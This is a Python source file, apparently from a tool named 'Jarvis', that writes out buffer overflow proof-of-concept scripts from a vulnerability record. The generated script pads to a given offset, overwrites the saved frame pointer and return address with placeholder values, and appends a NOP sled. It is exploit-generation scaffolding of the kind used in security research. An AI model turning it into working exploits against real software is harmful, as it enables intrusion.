"""Buffer overflow exploit template for Jarvis."""
from typing import Dict, Any


def render_buffer_overflow(vuln: Dict[str, Any]) -> str:
    trigger = vuln.get("trigger_primitives", {})
    overflow_val = trigger.get("overflow_value", "0x1000")
    offset = trigger.get("offset", "0x100")
    target = vuln.get("target", "target_binary")
    cve_id = vuln.get("cve_id", "CVE-XXXX-XXXX")
    description = vuln.get("description", "")
    output_file = "poc_" + cve_id.replace("-", "_").lower() + ".bin"

    c = '#!/usr/bin/env python3\n'
    c += '"""Buffer overflow PoC for ' + cve_id + '\n'
    c += 'Target: ' + target + '\n'
    c += 'Description: ' + description + '\n'
    c += '\n'
    c += 'Mechanism: Overflow buffer at offset ' + offset + ' with controlled data\n'
    c += '"""\n'
    c += 'import struct\n'
    c += 'import sys\n'
    c += 'import os\n\n\n'
    c += 'def build_overflow_payload(offset=' + offset + ', overflow_size=' + overflow_val + ') -> bytes:\n'
    c += '    """Build the buffer overflow payload.\n\n'
    c += '    Offset to control: ' + offset + '\n'
    c += '    Overflow size: ' + overflow_val + '\n'
    c += '    """\n'
    c += '    payload = b"\\x41" * offset\n'
    c += '    payload += struct.pack("<Q", 0x4141414141414141)  # Saved RBP\n'
    c += '    payload += struct.pack("<Q", 0x4242424242424242)  # Return address\n'
    c += '    payload += b"\\x90" * 64  # NOP sled\n'
    c += '    return payload\n\n\n'
    c += 'def main():\n'
    c += '    payload = build_overflow_payload()\n'
    c += '    output = "' + output_file + '"\n'
    c += '    with open(output, "wb") as f:\n'
    c += '        f.write(payload)\n'
    c += '    print(f"[+] Generated ' + output_file + ' ({len(payload)} bytes)")\n'
    c += '    print(f"[*] Overflow: offset ' + offset + ' + ' + overflow_val + ' bytes")\n\n\n'
    c += 'if __name__ == "__main__":\n'
    c += '    main()\n'
    return c
